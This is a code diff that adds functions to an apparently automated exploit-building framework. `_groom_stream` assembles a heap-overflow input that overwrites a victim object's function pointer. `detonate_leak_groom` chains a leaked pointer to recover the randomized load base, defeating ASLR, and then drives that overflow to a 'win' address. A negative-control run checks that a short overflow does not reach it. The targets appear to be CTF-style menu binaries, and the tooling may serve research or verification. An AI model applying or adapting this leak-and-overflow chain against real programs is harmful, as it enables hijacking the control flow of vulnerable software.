@@ -113,6 +113,44 @@ def lower(plan: AdjacentOverflowPlan, spec: MenuSpec, *, negative: bool = False)
     ))
 
 
+def _groom_stream(plan: AdjacentOverflowPlan, spec: MenuSpec, win_value: int, *,
+                  negative: bool = False) -> bytes:
+    """The groom input stream with `win_value` written into the victim's function pointer (or, for
+    the negative control, the short overflow that stops one word short). `win_value` is a RUNTIME
+    address, so this is reused by the leak-consuming chain with the relocated win."""
+    data = plan.negative_payload if negative else plan.negative_payload + _p64(win_value)
+    return b"".join((spec.alloc_buf(plan.buf_request), spec.alloc_obj(),
+                     spec.edit_buf(data), spec.trigger()))
+
+
+def detonate_leak_groom(exe: str, plan: AdjacentOverflowPlan, spec: MenuSpec, *, win_off: int,
+                        target_bytes: bytes, argv: Optional[list] = None,
+                        timeout: float = 8.0) -> bool:
+    """Leak -> groom -> control, the ASLR-defeating chain (doc-60 frontier). Composes the adjacent
+    -overflow groom with the PIE two-stage oracle: stage 1 reads the pointer the target DISCLOSES and
+    recovers the load base, stage 2 drives the groom with the victim's function pointer overwritten
+    by `base + win_off` (the runtime win). Sound by the same contract as the no-leak case -- the
+    positive stream must reach the relocated win AND the negative control (short overflow, no
+    overwrite) must NOT -- so a target that reaches win without our overwrite is rejected.
+
+    This is the leak-consuming analogue of `detonate_adjacent_overflow`: use it when the win target
+    is in a PIE image (or otherwise ASLR-randomized) and the target first discloses a pointer. The
+    groom's adjacency is still proven by `TcacheModel`; only the win ADDRESS now comes from the leak
+    rather than a fixed file vaddr."""
+    from . import detonate
+    pos, base = detonate.reaches_runtime_address(
+        exe, win_off=win_off, target_bytes=target_bytes,
+        make_payload=lambda _base, win_rt: _groom_stream(plan, spec, win_rt, negative=False),
+        argv=argv, timeout=timeout)
+    if not pos:
+        return False
+    neg, _ = detonate.reaches_runtime_address(
+        exe, win_off=win_off, target_bytes=target_bytes,
+        make_payload=lambda _base, win_rt: _groom_stream(plan, spec, win_rt, negative=True),
+        argv=argv, timeout=timeout)
+    return not neg
+
+
 def detonate_adjacent_overflow(exe: str, plan: AdjacentOverflowPlan, spec: MenuSpec, *,
                                input_mode: str = "stdin", argv: Optional[list] = None,
                                timeout: float = 8.0) -> bool:
